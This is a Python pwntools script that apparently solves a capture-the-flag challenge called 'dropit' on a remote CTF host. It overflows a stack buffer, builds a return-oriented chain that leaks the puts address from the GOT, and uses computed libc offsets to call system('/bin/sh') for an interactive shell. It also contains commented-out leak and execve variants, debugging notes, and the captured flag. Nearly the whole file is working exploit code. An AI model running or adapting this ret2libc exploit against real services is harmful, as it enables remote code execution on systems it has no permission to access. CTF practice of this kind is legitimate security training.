# RazviOverflow
# Python 3

from pwn import *

pop_rdi_ret = p64(0x0000000000401203)
pop_rsi_pop_r15_ret = p64(0x0000000000401201)
ret_gadget = p64(0x000000000040101a)

library = ELF("./dropit")

setvbuf_got_address = p64(library.got[b'setvbuf'])
fgets_got_address = p64(library.got[b'fgets'])
puts_got_address = p64(library.got[b'puts'])
puts_plt_address = p64(library.plt[b'puts'])
main_address = p64(library.symbols[b'main'])

# Binary reads 0x64 bytes from rbp-0x30

#binary = process("./dropit")
binary = remote("challenges.ctfd.io", 30261)
print(binary.recvline())

payload = b"A" * 0x30 + b"B" * 0x08 + pop_rdi_ret + puts_got_address + puts_plt_address + main_address
binary.sendline(payload)
received = binary.recvline()
print("Received -> " + str(received.split(b"\n")[0]))
print(received)
puts_address = u64(received.split(b"\n")[0].strip().ljust(8, b"\x00"))
print("Puts address -> " + str(hex(puts_address)))
binary.recv()

'''
payload = b"A" * 0x30 + b"B" * 0x08 + pop_rdi_ret + fgets_got_address + puts_plt_address + main_address
binary.sendline(payload)
received = binary.recv().split(b"\n")[0]
#print(received)
fgets_address = u64(received.strip().ljust(8, b"\x00"))
print("fgets address -> " + str(hex(fgets_address)))
binary.recv()

payload = b"A" * 0x30 + b"B" * 0x08 + pop_rdi_ret + setvbuf_got_address + puts_plt_address + main_address
binary.sendline(payload)
received = binary.recv().split(b"\n")[0]
#print(received)
setvbuf_address = u64(received.strip().ljust(8, b"\x00"))
print("Setvbuf address -> " + str(hex(setvbuf_address)))
'''

'''
Puts address -> 0x7fb267f15d90
fgets address -> 0x7fb267f13fa0
Setvbuf address -> 0x7fb267f16630

https://libc.nullbyte.cat/?q=puts%3Ad90%2Cfgets%3Afa0%2Csetvbuf%3A630&l=libc6_2.32-0ubuntu3_amd64
'''

# Remote addresses relatives to puts address
system_address = p64(puts_address - 0x309d0)
str_bin_sh_address = p64(puts_address + 0x12d68f)

'''
print("SYSTEM ADDRESS FROM REMOTE -> " + str(hex(u64(system_address))))
print("STR BIN SH ADDRESS FROM REMOTE -> " + str(hex(u64(str_bin_sh_address))))
execv_address = p64(puts_address + 0x5df40)
execve_address = p64(puts_address + 0x5dde0)

remote_glibc = ELF("./libc6_2.32-0ubuntu2_amd64.so")

remote_glibc_puts_offset = remote_glibc.symbols[b'puts']
remote_glibc_base_address = puts_address - remote_glibc_puts_offset
system_address = p64(remote_glibc_base_address + remote_glibc.symbols[b'system'])
str_bin_sh_address = p64(remote_glibc_base_address + next(remote_glibc.search(b'/bin/sh')))
'''
# Local adrresses
# https://libc.nullbyte.cat/d/libc6_2.30-2_amd64.symbols
#system_address = p64(puts_address - 0x2d780)
#str_bin_sh_address = p64(puts_address + 0x1121bc)
#execv_address = p64(puts_address + 0x55140)
#execve_address = p64(puts_address + 0x552a0)


# THE PROBLEM WAS MOVAPS ISSUE 
# https://ropemporium.com/guide.html

#definitive_payload = b"A" * 0x30 + b"B" * 0x08 + ret_gadget + pop_rdi_ret + str_bin_sh_address + ret_gadget + pop_rsi_pop_r15_ret + p64(0x00) + p64(0x00) + ret_gadget + execve_address
#definitive_payload = b"A" * 0x30 + b"B" * 0x08 + pop_rdi_ret + str_bin_sh_address + ret_gadget + pop_rsi_pop_r15_ret + p64(0x00) + p64(0x00) + ret_gadget +execv_address
definitive_payload = b"A" * 0x30 + b"B" * 0x08 + pop_rdi_ret + str_bin_sh_address + ret_gadget + system_address

binary.sendline(definitive_payload)
#print(binary.recv())

binary.interactive()

# nactf{r0p_y0ur_w4y_t0_v1ct0ry_698jB84iO4OH1cUe}
